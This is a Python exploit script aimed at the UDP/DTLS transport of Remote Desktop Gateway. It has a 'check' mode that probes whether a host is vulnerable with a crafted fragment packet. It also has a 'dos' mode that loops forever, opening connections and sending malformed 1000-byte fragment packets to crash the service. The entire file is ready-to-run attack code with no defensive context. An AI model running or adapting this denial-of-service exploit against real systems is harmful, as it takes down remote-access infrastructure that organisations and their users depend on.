#!/bin/env python3
from cryptography.hazmat.bindings.openssl.binding import Binding
from OpenSSL import SSL
import argparse
import os
import select
import signal
import socket
import struct
import sys

TIMEOUT = 3

def init_dtls():
        binding = Binding()
        binding.init_static_locks()
        SSL.Context._methods[0]= getattr(binding.lib, "DTLSv1_client_method")

def log_info(s):
    print(f"\033[96m[*] {s}\033[0m")

def log_success(s):
    print(f"\033[92m[+] {s}\033[0m")

def log_error(s):
    print(f"\033[91m[-] {s}\033[0m")

class Packet:
    def __init__(self, fragment_id = 0, no_of_fragments = 1, fragment_length = 0, fragment = b""):
        self.fragment_id     = fragment_id
        self.no_of_fragments = no_of_fragments
        self.fragment_length = fragment_length
        self.fragment        = fragment
        self.pkt_ID          = 5
        self.pkt_Len         = 0

    def update_pkt_Len(self):
        self.pkt_Len = len(self.fragment) + 6

    def __bytes__(self):
        self.update_pkt_Len()

        buf  = b""
        buf += struct.pack("<HHHHH", 
                            self.pkt_ID,
                            self.pkt_Len,
                            self.fragment_id, 
                            self.no_of_fragments, 
                            self.fragment_length)
        buf += self.fragment

        return buf

class Connection:
    def __init__(self, host = None, port = None, shouldConnect = True):
        self.host          = host
        self.port          = port
        self.shouldConnect = shouldConnect

        init_dtls()

        signal.signal(signal.SIGALRM, self.broken_connection)

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.connection = SSL.Connection(SSL.Context(0), self.socket)
        
        if shouldConnect:
            self.connect()

    def broken_connection(self, signum, frame):
        log_success("Connection not responding")

        try:
            self.close()
        except:
            pass

        sys.exit()

    def connect(self):
        signal.alarm(TIMEOUT)
        try:
            self.connection.connect((self.host, self.port))
            self.connection.do_handshake()
        except SSL.SysCallError:
            log_error("Could not connect to RD Gateway")
            sys.exit()
        signal.alarm(0)

    def send_dos_packet(self, id):
        packet = Packet(
            id, id, 1000, b"\x41"*1000
        )
        self.write(bytes(packet))

    def is_vulnerable(self):
        log_info(f"Checking if {self.host} is vulnerable...")
        
        packet = Packet(
            0, 65, 1, b"\x00"
        )

        self.write(bytes(packet))
        
        ready = select.select([self.socket], [], [], TIMEOUT)
        if ready[0]:
            buf = self.read(16)
            return not (0x8000ffff == struct.unpack('<L', buf[-4:])[0])
        
        return True

    def close(self):
        self.connection.shutdown()

    def write(self, buffer):
        self.connection.send(buffer)
        
    def read(self, size):
        return self.connection.recv(size)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-M", "--mode", choices=["check","dos"], required=True, type=str.lower, default=False, help="Mode")
    parser.add_argument("-P","--port", default=3391, help="UDP port of RDG, default: 3391", required=False, type=int)
    parser.add_argument("host", help="IP address of host")
    
    args = parser.parse_args()

    if args.mode == "check":
        connection = Connection(args.host, args.port)
        is_vulnerable = connection.is_vulnerable()

        if is_vulnerable:
            log_success("Host is vulnerable")
        else:
            log_error("Host is not vulnerable")
        
    if args.mode == "dos":
        log_info(f"Sending DoS packets to {args.host}...")

        i = 0
        while i > -1:
            connection = Connection(args.host, args.port)
            for n in range(4):
                connection.send_dos_packet(i+n)
            i += 1